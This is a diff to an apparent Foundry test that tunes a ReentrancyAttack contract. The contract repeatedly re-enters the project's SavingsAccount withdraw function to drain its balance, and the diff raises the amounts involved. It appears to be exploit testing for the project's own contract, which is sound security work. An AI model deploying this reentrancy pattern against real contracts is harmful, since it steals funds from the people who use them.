@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+import "forge-std/Test.sol";
 import "../src/SavingsAccount.sol";
 
 contract ReentrancyAttack {
@@ -18,11 +19,9 @@ contract ReentrancyAttack {
 
         if (balance > 0) {
             if (savingsBalance > 0) {
-                savingsAccount.deposit{value: 1 ether}();
-                uint256 withdrawAmount = balance > 2 ether ? 2 ether : balance;
+                savingsAccount.deposit{value: 10 ether}();
+                uint256 withdrawAmount = balance > 15 ether ? 15 ether : balance;
                 savingsAccount.withdraw(withdrawAmount);
-            } else {
-                return;
             }
         }
     }
@@ -34,7 +33,7 @@ contract ReentrancyAttack {
         savingsAccount.deposit{value: 100 ether}();
 
         // Start the attack by withdrawing 2 ether
-        savingsAccount.withdraw(2 ether);
+        savingsAccount.withdraw(10 ether);
     }
 
     function collectFunds() external {
